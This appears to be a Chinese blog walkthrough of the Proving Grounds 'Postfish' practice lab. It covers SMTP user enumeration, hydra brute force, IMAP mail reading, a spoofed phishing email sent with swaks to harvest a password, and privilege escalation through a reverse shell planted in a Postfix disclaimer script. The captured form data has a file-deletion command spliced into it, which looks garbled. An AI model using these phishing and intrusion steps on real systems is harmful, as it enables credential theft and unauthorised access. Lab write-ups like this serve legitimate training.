---
title: Proving Grounds Practice-Postfish
date: 2025-6-13 20:00:00
tags: 红队
categories: 红队打靶-Linux
---



# 信息收集

## nmap

![image-20250613143734775](./Postdish/image-20250613143734775.png)

# smtp

将网站上的一些任务写进文件，后面用来爆破是否存在

![image-20250613143806167](./Postdish/image-20250613143806167.png)

![image-20250613143746384](./Postdish/image-20250613143746384.png)

cewl工具会爬取网站上类似于用户名的字段

![image-20250613144505239](./Postdish/image-20250613144505239.png)

![image-20250613144455125](./Postdish/image-20250613144455125.png)

根据爆破出来的几个存在的用户名，生成一份用户名表和密码表（其中大小写都要包含），密码和用户名相同，然后使用hydra爆破几个开放的协议

# imap协议

爆破imap协议时存在正确的用户名

![image-20250613152136676](./Postdish/image-20250613152136676.png)

```
Sales:sales
```

通过telnet登录到imap查看其中的邮件

连接方法：https://ssorc.tw/3196/how-to-use-telnet-command-to-connect-to-imap/

![image-20250613154147411](./Postdish/image-20250613154147411.png)

伪造邮件让对方把邮件内容发给我们

```
swaks --to Brian.Moore@postfish.off --from it@postfish.off --server 192.168.168.137 --body "http://192.168.45.219/" --header "Subject:Please Reset Your Password via such link"  --suppress-data
```

![image-20250613172741485](./Postdish/image-20250613172741485.png)

```
first_name=Brian&last_name=Moore&email=brian.moore%postfish.off&username=brian.moore&password=EternaLSunshinE&confifind /var/mail/ -type f ! -name sales -delete_password=EternaLSunshinE      
```

得到密码之后ssh可以直接连接

# 提权

![image-20250613174225758](./Postdish/image-20250613174225758.png)

该文件是免责声明，当发送邮件时该文件被触发，所以我们修改文件之后在发送一次邮件就可以执行我想执行的代码

修改文件内容为反弹shell，可以得到filter的shell，该用户具有mail的sudo权限，可以提权

![image-20250613175451802](./Postdish/image-20250613175451802.png)

![image-20250613175501961](./Postdish/image-20250613175501961.png)